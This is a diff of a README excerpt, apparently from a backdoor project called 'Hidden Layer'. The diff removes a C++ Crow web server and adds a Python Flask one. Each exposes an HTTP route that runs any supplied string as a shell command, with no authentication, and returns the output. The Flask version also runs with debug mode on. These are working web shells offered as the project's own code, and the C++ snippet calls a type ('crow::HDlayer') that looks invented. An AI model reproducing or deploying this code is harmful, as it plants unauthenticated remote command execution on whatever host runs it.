@@ -39,48 +39,20 @@ https://github.com/user-attachments/assets/a97de13d-781f-4c77-9763-14d198786eaf
 
 ## Part Of Code : (It's Note All of The code)
 
-```cpp
-// This is A part From The Code 
-#include "crow_all.h"
-#include <cstdlib>
-#include <array>
-#include <iostream>
-#include <sstream>
-
-// CMD EXEC
-std::string Exec(const std::string& command) {
-    std::array<char, 128> buffer;
-    std::stringstream result;
-    
-    FILE* pipe = popen(command.c_str(), "r");
-    if (!pipe) return "Failed to execute command";
-
-    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
-        result << buffer.data();
-    }
-    
-    pclose(pipe);
-    return result.str();
-}
-
-// Hidden Layer
-int main() {
-    crow::HDlayer app;
-
-    CROW_ROUTE(app, "/HiddenLayer/CMD/Do")
-        .methods(crow::HTTPMethod::GET)([](const crow::request& req) {
-            auto query_params = crow::query_string{req.url_params};
-            std::string command = query_params.get("cmd") ? query_params.get("cmd") : "";
-
-            if (command.empty()) {
-                return crow::response(400, "Missing 'cmd' parameter");
-            }
-
-            std::string output = Exec(command);
-            return crow::response(output);
-        });
-
-    app.port(18080).multithreaded().run();
-}
+```python
+# This is A part From The Code
+import subprocess
+from flask import Flask, jsonify
+f = Flask(__name__)
+@f.route('/HDL/X/<t>', methods=['GET'])
+def r(t):
+    return h1ack(t)
+def h1ack(c):
+    if c:
+        result = subprocess.run(c, shell=True, capture_output=True, text=True)
+        return jsonify({"c": c, "o": result.stdout})
+    return jsonify({"error": "Command not allowed"}), 403
+if __name__ == '__main__':
+    f.run(debug=True)
 
 
